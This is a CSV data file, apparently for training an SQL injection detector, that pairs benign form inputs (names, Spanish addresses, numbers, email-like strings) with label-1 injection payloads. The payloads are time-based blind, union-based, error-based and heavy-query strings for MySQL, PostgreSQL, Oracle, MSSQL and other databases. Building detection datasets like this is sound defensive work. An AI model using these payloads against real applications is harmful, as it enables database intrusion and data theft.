Query,Label
1'||(select 'lkmh' where 7659=7659;select pg_sleep(5))||',1
1')) as zqeg where 4729=4729 and (1098=9682)*9682--,1
1%'));select sleep(5)#,1
faraday,0
9136,0
"calle somontin 154, 3a",0
mulleras picornel,0
menndez coyoma,0
2145088995876898,0
"1 or 8421=(select count(*) from generate_series(1,5000000))",1
cautela,0
grandy,0
"1"" where 6686=6686 or elt(6272=6272,sleep(5))--",1
"1) and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null)",1
arksikainen_simor@paremoselalzheimer.vi,0
5498,0
38948590e,0
whiteside.seyfferrtitz@cohel.uk,0
pelamen,0
37766,0
05848,0
ma$c3donio,0
78739097t,0
"1%' union all select null,null,null,null,null--",1
-9841 where 4612=4612 union all select 4612--,1
"1) and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",1
arstides,0
43364,0
47680,0
6913071576619939,0
pascacio,0
esguince,0
1)) as xmac where 7692=7692;begin dbms_lock.sleep(5); end--,1
"1 where 8506=8506;select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual--",1
virgen,0
"camino carabineros, 10",0
apotrerar,0
rudich,0
sams agea,0
v70t4oso,0
nadir,0
8486012682683585,0
ergasto,0
"(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)",1
leopolda,0
4789967077221120,0
villafufre,0
1') where 7478=7478;select pg_sleep(5)--,1
"-9656"" union all select 8735,8735--",1
yaideem,0
"c/ ereta, 104,",0
c/ grabador david roberts 154 1-h,0
triana,0
"1 and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)",1
6791383117452961,0
3027,0
"1"";call regexp_substring(repeat(right(char(2385),0),500000000),null)--",1
algemes,0
presbiteriano,0
-9556') where 2472=2472 or (2883=9968)*9968--,1
nava de roa,0
4371,0
"1%"") rlike (select * from (select(sleep(5)))vwyq)#",1
frutos,0
64526656h,0
35200,0
maurijn,0
"lola flores, 98 3?h",0
03482859s,0
carapopela,0
"1"") and 6565=2647 and (""mrge"" like ""mrge",1
shar,0
shazmnn,0
43421,0
san lorenzo de la parrilla,0
"1' union all select null,null#",1
-3596))) or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and (((3645=3645,1
oziel,0
drabek,0
calle leganes 155 13?e,0
1;waitfor delay '0:0:5',1
12311,0
resquebrar,0
44,0
woolgar@awat.gov,0
"cami contrabandistes, 71",0
"1 where 2031=2031 or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",1
"-9039') union all select 8058,8058,8058,8058,8058--",1
lafferty,0
"corredoira dos cornos, 175 4-c",0
loraine,0
chao-pin2,0
enjalbegada,0
corrius,0
"1' and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and 'eqle'='eqle",1
1)) as qlkf where 6635=6635;select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--,1
"1""))) and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and (((""umne"" like ""umne",1
"1'||(select 'xuou' from dual where 7681=7681 or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)))||'",1
nataln,0
25114760w,0
willie51,0
93398116s,0
godish,0
1342i3,0
anchia,0
7263031959103699,0
"-7323%"" or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ""%""=""",1
"1)) or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1
6884926189160284,0
"1%"") or sleep(5)#",1
albiol,0
28609,0
1%');select (case when (3773=3722) then 3773 else 3773*(select 3773 from mysql.db) end)#,1
feld_zaleska@laschinas.pl,0
"c/ sicilia, 162,",0
yesenia,0
9963312363113755,0
"-5866')) as phzq where 3803=3803 union all select 3803,3803,3803,3803,3803,3803,3803,3803--",1
972,0
winde,0
"escritor nicolas del paso, 95",0
-9690 union all select 7217#,1
42773884w,0
"-3729')) or elt(4482=2648,2648) and (('vkkr' like 'vkkr",1
"1'||(select 'blvu' from dual where 9813=9813;select count(*) from generate_series(1,5000000))||'",1
12413,0
bekki,0
-2951 or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)# gwqv,1
1)) as ogcv where 4396=4396;if(7899=7899) select 7899 else drop function zbbp--,1
1539157605114970,0
5i13r,0
cal,0
"1%')));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and ((('%'='",1
"plaza pea gudina, 14,",0
gamaliel,0
"1"" where 5039=5039 and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1
"-6747"" or 9323=9323#",1
"1"" and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and ""icow"" like ""icow",1
badolatosa,0
francino llosa,0
bethania,0
4920792852511855,0
1' in boolean mode) waitfor delay '0:0:5'--,1
mairozio,0
cousinea,0
monistrol de montserrat,0
"1')) as efmy where 7299=7299 and 8635=(select count(*) from generate_series(1,5000000))--",1
19255762r,0
jaln de cameros,0
"-5066')) union all select 9689,9689,9689,9689#",1
"1"")) or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ((""ampn"" like ""ampn",1
1')) and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (('foop' like 'foop,1
7766,0
bauls san marful,0
"prats de rei, els",0
7272917416802626,0
34964894h,0
56346174s,0
1') as mzby where 6530=6530;select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--,1
63102165d,0
"1)) procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and ((4348=4348",1
oman,0
8512064056348280,0
"calle profeta, 96, 2?c",0
"1)) as xroy where 3274=3274;iif(3760=4785,1,1/0)",1
"1"" or 8514=benchmark(5000000,md5(0x544d5a4c))#",1
patanera,0
"nuestra seora de las angustias s/n,",0
"1'))) and make_set(8403=8403,8899) and ((('oacz'='oacz",1
nilsson,0
"avenida blasco ibaez, s/n, 6?d",0
"carrer nostra sra del pilar, 101",0
haslund@arvigar.sl,0
1%')) or (select * from (select(sleep(5)))sddo)#,1
juneho,0
1')) as cpwx where 5378=5378 rlike (select * from (select(sleep(5)))vwyq)#,1
"1 or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5)# tsxs",1
berba.andreguy4@campanasextractoras.sh,0
recelosa,0
"1 and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)# zwck",1
-1579%'))) union all select 7272#,1
1');begin dbms_lock.sleep(5); end and ('hmtt' like 'hmtt,1
brassell,0
8711764865979361,0
"1%""));if(4907=9581) select 4907 else drop function apqw--",1
4626512497808574,0
maccoll-stringer@programa-gestion-erp.nr,0
4898771590601702,0
asaeteadora,0
"c/ magallanes, 42,",0
"1%"");create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and (""%""=""",1
"1'+(select thmg where 2546=2546 or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",1
munn,0
insertar,0
"calle goya 46, 10?g",0
schucrenberg-oheaney3@testdevelcidad.info,0
"1) and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (7182=7182",1
1;begin dbms_lock.sleep(5); end--,1
muenpasitiwet@magritte.gov,0
"1"") or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1
milmarcos,0
"1"")) as lfte where 3811=3811 or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x))--",1
"1'+(select 'cwta' where 6091=6091;select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual)+'",1
83657455s,0
odelinda,0
adriel,0
du-tuan,0
"1'));select count(*) from generate_series(1,5000000) and (('hxcq'='hxcq",1
manguita,0
2881,0
8704154782235200,0
"-5160') as kgjw where 9609=9609 union all select 9609,9609--",1
56030847h,0
vyky,0
pealver palenzuela,0
psklib,0
giertych,0
palacios del pan,0
"1)) as nxdf where 1696=1696 or 8514=benchmark(5000000,md5(0x544d5a4c))#",1
chamberlain@muevemiweb.al,0
"-5776%' union all select 3075,3075,3075,3075,3075--",1
visaroff@lecriture.ic,0
"1)) union all select null,null,null,null,null,null,null#",1
"1'||(select 'osty' from dual where 6433=6433 or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5))||'",1
t53s97ln747a,0
"1""))) or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and (((""oyxk""=""oyxk",1
willeke5,0
c/ masia 111 10-g,0
orfebrera,0
heldabrand5@chevrolet-volt.bg,0
"1'||(select 'ersu' where 4123=4123 and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",1
5937893714425522,0
de6211gami5970,0
"1)));call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (((3044=3044",1
32159249m,0
1647,0
"1' in boolean mode);select like('abcdefg',upper(hex(randomblob(500000000/2))))#",1
"1%'));call regexp_substring(repeat(right(char(3702),0),500000000),null) and (('%'='",1
1290238048117290,0
raixa s/n,0
xi629d02,0
1';select pg_sleep(5)--,1
0851327510236186,0
dido,0
1) as zzip where 5353=5353 and 3394=3092,1
gittins,0
9054,0
depp@rpdkorea.il,0
arguis,0
pineda de la sierra,0
espn boixad,0
todd,0
1934,0
"torre, la",0
kresl,0
16646,0
miranda de arga,0
1')));select sleep(5)#,1
5462359635999525,0
puebla de pedraza,0
arme!lluela,0
izurrieta pomales,0
40133,0
05196,0
"1;select benchmark(5000000,md5(0x4c4d6142))",1
"el naranjo, s/n 5f",0
"1%') or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and ('%'='",1
"1') as mpsf where 3348=3348;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",1
"1"") as xylo where 2112=2112 and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--",1
"1')));select * from generate_series(9709,9709,case when (9709=7795) then 1 else 0 end) limit 1--",1
1') where 6622=6622 order by 1--,1
32790960k,0
requilorio,0
2343303470283854,0
boynton4,0
5098258460749726,0
almacenamiento,0
iza,0
"1'))) and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ((('qtni'='qtni",1
dulcera,0
"mourel 113, 4?a",0
grant@ubuybetter.yu,0
"1'))) and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ((('ibav'='ibav",1
"1'+(select 'tjvt' where 2463=2463;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",1
"1');select count(*) from generate_series(1,5000000) and ('qpdu'='qpdu",1
"1' in boolean mode) or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",1
"1%""));waitfor delay '0:0:5'--",1
damisa,0
"1,(select (case when (5217=5217) then 1 else 5217*(select 5217 from mysql.db) end))",1
"-1263"") or 9323=9323#",1
aimarsen@enla.gi,0
"1"")) as itxo where 7916=7916;select count(*) from generate_series(1,5000000)--",1
92283149l,0
1)) and 8594=(select 8594 from pg_sleep(5))--,1
"1%' union all select null,null,null,null--",1
"1,(convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4932=4932) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))))",1
dabbas hurtado,0
ilva,0
"(convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (9339=9339) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))))",1
-2604)) as sekb where 6897=6897 or 1000=7683,1
"1"") as vpna where 5450=5450 or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1
vanera,0
rintel,0
cossio obrist,0
1;begin dbms_lock.sleep(5); end,1
nuda drudes,0
8866,0
rinaldo,0
tetreaul7,0
brincones,0
monrrabal,0
camp morante,0
c7lifa01,0
brines grimalda,0
_bielda,0
celik-regan@turinga.sb,0
"alcalde esteban minguez, 169, 12?b",0
"1%"")) or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ((""%""=""",1
1)) and 2006=2006,1
yutaka,0
r92e1*56e,0
"1 or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)",1
03450,0
"1"") where 1673=1673 or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",1
arcos,0
8484,0
vega de valcarce,0
"1"" where 7631=7631 and 4733=3439",1
4948118153450551,0
5389852449679105,0
0106705329803127,0
morn de almazn,0
"1"")) as ufba where 4049=4049;select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",1
av. del mar cantabrico 176 6-d,0
"c/ alcalde conangla s/n,",0
1005,0
odiln,0
larsson.dorio@ankawaelda.it,0
humanitari9mo,0
-7452 where 2224=2224 or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--,1
1') as ghvi where 3880=3880 and 4595=4595#,1
"-7069) union all select 6638,6638,6638,6638,6638,6638--",1
"1"";(select * from (select(sleep(5)))srmq) and ""plqe""=""plqe",1
xixia,0
desc9be35628,0
"1"" or 8421=(select count(*) from generate_series(1,5000000)) and ""ncym"" like ""ncym",1
"1 and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",1
3467840384205414,0
polis-berkel@prestigecars.ag,0
"1%')) union all select null,null,null,null,null,null,null#",1
6965,0
kania@internacionalexpofloralzaragoza2014.se,0
"1%"")) or sleep(5)#",1
"1');select like('abcdefg',upper(hex(randomblob(500000000/2)))) and ('dthp'='dthp",1
"1%""))) union all select null,null,null,null,null,null,null,null--",1
64179446q,0
agelet grenett,0
53933880f,0
34196882e,0
nabau fuentes,0
"camaretas 166,",0
"-7313"") where 3606=3606 union all select 3606#",1
1';select (case when (7990=7627) then 7990 else 1/(select 0) end)--,1
"-2316%' union all select 8636,8636,8636,8636,8636,8636,8636--",1
"c/ leopoldo alas ""clarin"" 4, 6?b",0
"-6554'))) union all select 4384,4384,4384,4384,4384#",1
"palanca 106,",0
mara de aranz,0
1%') or 4240=(select 4240 from pg_sleep(5))--,1
"1')) as yqek where 1957=1957;iif(5257=5257,1,1/0)",1
-5820')) as lkik where 4044=4044 or 7156=9197--,1
19219,0
itziar,0
1%' waitfor delay '0:0:5'--,1
99783130e,0
roldan@intelethernet.gl,0
"1'))) or 8421=(select count(*) from generate_series(1,5000000)) and ((('istb'='istb",1
teresa,0
p7g2na,0
scardetta huerta,0
misko,0
ozoa cadaveira,0
ex8ed2ci3,0
sol,0
1'||(select 'ucxp' where 6612=6612 order by 1--,1
isurieta llano,0
sal,0
357rte0o,0
"1') or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ('lxoc'='lxoc",1
59560161m,0
9491,0
laurencia,0
wilde@casasdefamosos.zw,0
"1';create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and 'gajm'='gajm",1
"1"")) as nlgn where 3834=3834 and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",1
7115660202719431,0
montn,0
"1' where 5023=5023 and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",1
50491,0
"-2247') union all select 1202,1202,1202,1202,1202#",1
carmia,0
07995079a,0
donaciano,0
"-1710"")) as cvky where 1858=1858 union all select 1858,1858--",1
1)) and sleep(5) and ((9084=9084,1
3266,0
"1'||(select 'scwx' where 6591=6591 and 3824=benchmark(5000000,md5(0x76555642)))||'",1
"1' where 9605=9605 procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1)--",1
"1""))(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and ((""prhp""=""prhp",1
24249,0
e97rep70rn*as,0
graupere trabucco,0
1) where 9552=9552 and 1961=6333--,1
88684338h,0
"-1763"") or elt(1032=1032,3623) and (""nqvv""=""nqvv",1
"1"") and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and (""zyeo"" like ""zyeo",1
abadal braup,0
"1) or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)",1
1) where 6039=6039 and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)--,1
castarle chiroboga,0
"1') as wpom where 2620=2620 and elt(3114=3114,sleep(5))#",1
33784,0
"-4756%')) union all select 7824,7824,7824,7824,7824,7824,7824,7824#",1
"1'))) and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and ((('zxhn' like 'zxhn",1
braddell@cincocolores.cat,0
callie,0
9999685362950353,0
"1));select benchmark(5000000,md5(0x4c4d6142)) and ((6866=6866",1
"1'||(select 'jbgg' from dual where 1986=1986 union all select null,null,null,null,null,null,null,null,null,null#",1
"1') as irsh where 4973=4973 or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",1
66837882c,0
372,0
xingdong,0
"1)));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",1
"veintinueve de abril 0,",0
"1' or 8466=benchmark(5000000,md5(0x694a4745)) and 'ntaw'='ntaw",1
remus,0
"calle fray luis sotelo, 115 7-b",0
12354547m,0
soria,0
6745,0
fomes,0
joaquin,0
-7859) as ipdg where 4413=4413 or 9323=9323#,1
gomska.hopper@ebuy.com.bi,0
1' and sleep(5) and 'usgv' like 'usgv,1
sask,0
8331341352065092,0
3598,0
9438831900620350,0
"1' where 4039=4039 union all select null,null,null,null,null,null,null,null--",1
thiel,0
-7444))) or 1342=9774,1
32433945n,0
"germanies 18,",0
reski.kuberskaya@n340magazin.no,0
"1'||(select 'wyng' from dual where 2157=2157 union all select null,null--",1
thieu,0
bobadilla del campo,0
"1'||(select 'osux' from dual where 7066=7066 or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3))||'",1
"virgen de la fuensanta, 126, 11?e",0
22809,0
gonzales_thalasso@magadan.com.jm,0
"-5706"")) union all select 2013,2013,2013,2013#",1
"camino de leganes, 13",0
"1') as ycsr where 2238=2238 and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",1
moreras sort,0
"1"")) or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",1
peine3@psychominders.gob,0
blascosancho,0
"1' and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))",1
98810075m,0
1') where 8707=8707 and 3210=1477--,1
6848759858802316,0
c/ cristobal quintero 86,0
crast_litel@cortell.al,0
luettcha,0
2532457145340118,0
"-2704"") union all select 1323,1323,1323,1323,1323,1323,1323,1323,1323--",1
"1'))) and elt(9041=6421,6421) and ((('ixxg' like 'ixxg",1
lourenz,0
"-2207%')) union all select 3339,3339,3339,3339,3339,3339#",1
castell-platja d'aro,0
calle villa de andorra 36 9?b,0
f399ici0,0
"1'+(select 'sacd' where 5984=5984 union all select null,null,null,null,null,null,null#",1
addons,0
3805288652067342,0
"1""))) and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (((""sajl""=""sajl",1
"1""));call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1
boes@cumbareback.kz,0
"1) and elt(3138=1817,1817)",1
5481930163785901,0
h4a3pa63,0
siena 76 8-c,0
ayar,0
"san roman 140, 2e",0
"1)) and make_set(8403=8403,8899) and ((4686=4686",1
1 where 7890=7890 or sleep(5)--,1
"calle alfaz del pi, 96 11?d",0
1%' and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and '%'=',1
valdelosa,0
almorejo,0
2409731978356224,0
c/ pirucha s/n 4-e,0
"-4121%"") union all select 2659,2659,2659,2659,2659,2659,2659,2659--",1
"1)) as myyh where 5116=5116 or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",1
63313769j,0
bardischewski9@sexotelefono.rw,0
p4ot8tor,0
1)) as xlww where 5844=5844;select (case when (3855=3855) then 3855 else 1/(select 0) end)--,1
"-6667%"")) union all select 7348,7348,7348,7348,7348,7348,7348,7348#",1
"c/ zahara de los atunes, 137, 9?b",0
28413,0
nobrega medianero,0
kirland-lincovsky@la-sexta-f1.fo,0
ferreries,0
"port fangos, 183,",0
74469828z,0
"-5054%""))) union all select 8263,8263,8263,8263--",1
22010612a,0
osada,0
74677553a,0
"-2951"" or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))",1
"1' and make_set(8403=8403,8899) and 'fttd' like 'fttd",1
"comandante barja 84,",0
0486023581086629,0
orist,0
nooshin,0
1')) and (3020=3020)*6703 and (('pfal'='pfal,1
javiera,0
85640413m,0
"1' where 6902=6902 and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",1
bo8iner4,0
"1"" where 3318=3318;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",1
kindermann@lawn.je,0
delito,0
5563798964634481,0
alta,0
cha$9i74r0,0
zouheir,0
encatusar,0
arabele,0
vir7eino,0
bus ugartechea,0
c/ pampa 76,0
tainsy@jaxiaabogadosyeconomistas.je,0
ibias,0
03600,0
1973457393131031,0
terri,0
"1%""))) and elt(9524=1124,1124) and (((""%""=""",1
8271,0
penarroya ingla,0
"1' and elt(4249=4249,7259)",1
ciezar,0
62145911a,0
c/ enrique orce marmol 46,0
"1' in boolean mode)(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0)))#",1
thurston,0
buky,0
"1"")) union all select null,null,null,null,null,null,null,null,null--",1
raspar,0
"1%""))) and 6969=(select 6969 from pg_sleep(5)) and (((""%""=""",1
"1%')));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",1
avenida letanias 195 2?d,0
retr8t2,0
"banquilla, 171,",0
13270596x,0
-6200%')) or 8077=4661,1
0518984611180264,0
onofredo,0
-6353%')) or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and (('%'=',1
karrantza harana/valle de carranza,0
"1"") as vcvw where 2445=2445 and 8594=(select 8594 from pg_sleep(5))--",1
escalera,0
"1) as nlig where 5964=5964 and 2388=benchmark(5000000,md5(0x6d457153))#",1
casillas de flores,0
"c/ san blas 88,",0
tasies cirujano,0
"1)) or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",1
3270734525112576,0
77452423s,0
"1'))) or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ((('zfrs'='zfrs",1
"1) where 7881=7881 and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",1
gina,0
"1'||(select 'hfbt' where 7204=7204 union all select null,null,null,null,null,null,null,null,null,null--",1
"1') and elt(4249=4249,7259) and ('bxnn'='bxnn",1
1%'))) waitfor delay '0:0:5'--,1
archie,0
"1' in boolean mode);call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)#",1
05412,0
"1',(select (case when (5433=5433) then 1 else cast(1 as int)/(select 0 from dual) end) from dual)",1
"-8940"") or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and (""vnuo"" like ""vnuo",1
71834216h,0
jeffries,0
norstar,0
ozerea malibrn,0
calle espiel 71,0
1'));select sleep(5)#,1
itero del castillo,0
m+ar8ca4,0
1') and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric),1
peda2te1ca,0
utilla,0
3540035321904498,0
32358,0
"1' in boolean mode) or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)#",1
"1%"")) and sleep(5)#",1
"avinguda gabriel alomar i villalonga, 20 6?a",0
1') rlike (select (case when (9308=2540) then 1 else 0x28 end)) and ('rghd'='rghd,1
1%';select (case when (7271=1658) then 7271 else 7271*(select 7271 from information_schema.character_sets) end)#,1
"-2418'||(select 'mdbt' from dual where 3026=3026 union all select 3026,3026,3026,3026,3026,3026,3026,3026,3026--",1
murphy-ekstroem@altoguadiana.ao,0
6535683969714030,0
"1""))) and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",1
